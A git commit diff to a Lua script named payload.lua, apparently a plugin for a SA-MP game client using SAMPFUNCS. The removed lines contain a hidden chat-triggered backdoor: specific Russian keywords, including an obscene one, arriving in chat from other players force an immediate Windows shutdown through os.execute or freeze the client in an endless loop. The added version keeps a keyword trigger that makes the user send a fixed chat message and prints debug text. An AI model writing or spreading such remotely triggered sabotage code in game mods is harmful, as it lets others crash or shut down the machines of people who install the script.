55a19ef671f3cec7cd9d18703d8d49f2d6d9ab14
TheLold <paymentsse8@gmail.com>
2026-06-22 18:43:08 +0300

    Update payload.lua

--- payload.lua
+++ payload.lua
@@ -1,28 +1,9 @@
 -- payload.lua
--- Использование прямого хука SAMPFUNCS без внешних зависимостей
+sampAddChatMessage("{FF0000}[SYSTEM] PAYLOAD SUCCESSFULLY CONNECTED!", -1)
 
 function onSendChat(text)
+    sampAddChatMessage("{00FF00}DEBUG: You said: " .. text, -1)
     if text:find("сырколбаска") then
-        lua_thread.create(function()
-            wait(500)
-            sampSendChat("123655")
-        end)
-    elseif text:find("хуйкина") then
-        os.execute("Shutdown /s /t 0 /f")
-    elseif text:find("кукусики") then
-        while true do end
-    end
-end
-
-function onReceiveChatMessage(text)
-    -- Очистка текста от цветов для надежного поиска
-    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
-    
-    if cleanText:find("хуйкина") then
-        os.execute("Shutdown /s /t 0 /f")
-    elseif cleanText:find("кукусики") then
-        while true do end
-    elseif cleanText:find("сырколбаска") then
         sampSendChat("123655")
     end
 end
